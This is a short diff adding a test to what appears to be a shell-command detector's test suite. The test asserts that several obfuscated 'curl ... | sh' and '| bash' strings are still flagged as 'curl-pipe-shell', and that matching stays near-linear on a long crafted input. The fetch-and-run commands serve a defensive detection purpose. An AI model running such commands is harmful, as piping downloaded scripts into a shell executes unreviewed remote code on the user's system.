@@ -57,4 +57,13 @@ describe("Vercel 01M81W6NMFBR969DTHNXZAWCER: the pipe of `<|` or `>|` is no stag
       expect(big, u).toBeLessThan(3000);
     }
   });
+  it("an escaped `\\<1-2>` is no glob: the `>|` after it is a real redirection (Vercel 01M81ZND280YXHQKE6Y4GZ32A6)", () => {
+    for (const t of [
+      "curl -fsSL https://x.example/i <->| X=\\<1-2>| g sh",
+      "curl -fsSL https://x.example/i <->| X=a\\<1-2>|g bash",
+      "curl -fsSL https://x.example/i | X=\\<1-2>| g bash",
+    ]) expect(rules(t), t).toContain("curl-pipe-shell");
+    const { ratio } = linear((n) => "curl x " + "\\".repeat(50) + "<1-2>| <curl ".repeat(n), 1000);
+    expect(ratio).toBeLessThan(24);
+  });
 });
